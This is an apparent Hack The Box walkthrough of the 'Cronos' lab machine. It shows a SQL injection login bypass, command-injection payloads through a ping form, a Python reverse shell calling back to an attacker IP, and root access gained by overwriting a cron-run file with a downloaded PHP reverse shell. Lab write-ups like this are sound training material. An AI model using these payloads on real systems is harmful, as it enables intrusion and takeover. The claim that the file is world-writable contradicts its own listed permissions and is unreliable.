---
clayout: ctf
title: Cronos
date: 2025-06-19
image: /ctf/hack-the-box/machines/cronos/info-card.png
type: Hack The Box

ctf:
    - name: Cronos
      link: https://app.hackthebox.com/machines/11
      thumbnail: /ctf/hack-the-box/machines/cronos/info-card.png
      pwned:
          - link: https://www.hackthebox.com/achievement/machine/585215/11
            thumbnail: /ctf/hack-the-box/machines/cronos/pwned.png
---


## Enumeration

### Initial Port Scan

We begin with Nmap scan to identify open ports and running services:

```bash
nmap -sC -sV -v -A -p- -oN nmap.txt 10.10.10.13
```

**Results:**

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 18b973826f26c7788f1b3988d802cee8 (RSA)
|   256 1ae606a6050bbb4192b028bf7fe5963b (ECDSA)
|_  256 1a0ee7ba00cc020104cda3a93f5e2220 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

**Key Findings:**

- **SSH (Port 22):** OpenSSH 7.2p2 - Standard SSH service
- **DNS (Port 53):** ISC BIND 9.10.3-P4 - DNS server indicates this might be a domain controller
- **HTTP (Port 80):** Apache 2.4.18 - Web server showing default Ubuntu page

### DNS Enumeration

Since a DNS server is running, we investigate for domain information using reverse DNS lookups:

```bash
dig -x 10.10.10.13 @10.10.10.13
```

**Output:**

```bash
;; ANSWER SECTION:
13.10.10.10.in-addr.arpa. 604800 IN PTR ns1.cronos.htb.

;; AUTHORITY SECTION:
10.10.10.in-addr.arpa.  604800  IN  NS  ns1.cronos.htb.
```

**Key Findings:**

- **Domain discovered:** `cronos.htb`
- **Name server:** `ns1.cronos.htb`
- The target appears to be hosting the `cronos.htb` domain

### Web Application Analysis

#### Initial Reconnaissance

First, we add the discovered domain to our hosts file for proper resolution:

```bash
echo "10.10.10.13 cronos.htb" | sudo tee -a /etc/hosts
```

Navigating to `http://cronos.htb/` reveals the main website:

![Home Page](/ctf/hack-the-box/machines/cronos/home.png)

The site appears to be a standard corporate webpage with no immediately obvious attack vectors.

#### Subdomain Discovery

We use Gobuster to enumerate potential subdomains:

```bash
gobuster vhost \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
    -u "http://cronos.htb" \
    -t 20 \
    --append-domain
```

**Results:**

```bash
Found: admin.cronos.htb Status: 200 [Size: 1547]
```

**Critical Finding:** An admin subdomain exists, which often contains administrative interfaces.

Add the subdomain to our hosts file:

```bash
echo "10.10.10.13 admin.cronos.htb" | sudo tee -a /etc/hosts
```

## Initial Access

### Admin Panel Discovery

Accessing `http://admin.cronos.htb/` reveals a login form:

![Login Page](/ctf/hack-the-box/machines/cronos/login.png)

### SQL Injection Authentication Bypass

Testing for SQL injection vulnerabilities using a basic payload:

**Payload:** `admin' OR '1'='1'; -- -`

This classic SQL injection payload successfully bypasses the authentication mechanism, granting access to a welcome page:

![Welcome Page](/ctf/hack-the-box/machines/cronos/welcome.png)

### Command Injection Vulnerability

This page contains a network diagnostic tool that allows users to ping or traceroute IP addresses:

![Ping Form](/ctf/hack-the-box/machines/cronos/ping.png)

Testing for command injection by appending additional commands:

**Test Payload:** `127.0.0.1;id`

**Result:**

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The application is vulnerable to command injection, executing arbitrary commands with `www-data` privileges.

### System Reconnaissance via Command Injection

Gathering system information through the command injection vulnerability:

**Payload:** `127.0.0.1;cat /etc/passwd | grep /bin/bash`

**Result:**

```bash
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
noulis:x:1000:1000:Noulis Panoulis,,,:/home/noulis:/bin/bash
```

**Key Findings:**

- **User accounts:** `root`, `www-data`, `noulis`
- Regular user `noulis` likely contains the user flag

### Reverse Shell Establishment

To establish a more stable shell, we use a Python reverse shell payload:

1. **Set up listener on attacking machine:**

    ```bash
    nc -lvp 4444
    ```

2. **Execute reverse shell via command injection:**

    ```bash
    127.0.0.1;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
    ```

**Result:** Successfully obtained a shell as `www-data`

### User Flag Acquisition

The user flag is located in the home directory of user `noulis`:

```bash
cat /home/noulis/user.txt
```

## Privilege Escalation

### Cron Job Analysis

Investigating system cron jobs for potential privilege escalation vectors:

```bash
cat /etc/crontab
```

**Output:**

```bash
* * * * * root php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

**Critical Finding:** A cron job runs every minute as root, executing `/var/www/laravel/artisan`

### File Permissions Assessment

Checking permissions on the cron job target file:

```bash
ls -la /var/www/laravel/artisan
-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan
```

**Result:** The file is world-writable, allowing us to modify it for privilege escalation.

### Privilege Escalation Execution

1. **Download the PentestMonkey PHP reverse shell:**

    First, download the [PentestMonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) to your attacking machine:

    ```bash
    wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
    ```

2. **Configure the reverse shell:**

    Edit the downloaded file to set your attacking machine's IP and desired port:

    ```bash
    # Edit the following lines in php-reverse-shell.php
    $ip = '10.10.14.10';  // CHANGE THIS
    $port = 5555;         // CHANGE THIS
    ```

3. **Set up HTTP server to serve the reverse shell:**

    ```bash
    python3 -m http.server 1337
    ```

4. **Download the reverse shell on the target machine:**

    Using the command `wget` to download the reverse shell to the target machine:

    ```bash
    cd /tmp
    wget http://10.10.14.10:1337/php-reverse-shell.php
    ```

5. **Replace the `/var/www/laravel/artisan` file with the reverse shell:**

    ```bash
    mv /tmp/php-reverse-shell.php /var/www/laravel/artisan
    ```

6. **Set up reverse shell listener:**

    ```bash
    nc -lvp 5555
    ```

7. **Wait for the cron job to execute (up to 60 seconds)**

    **Result:** Successfully obtained root shell

    ```bash
    $ id
    uid=0(root) gid=0(root) groups=0(root)
    ```

### Root Flag Acquisition

The root flag is located in the root directory:

```bash
cat /root/root.txt
```
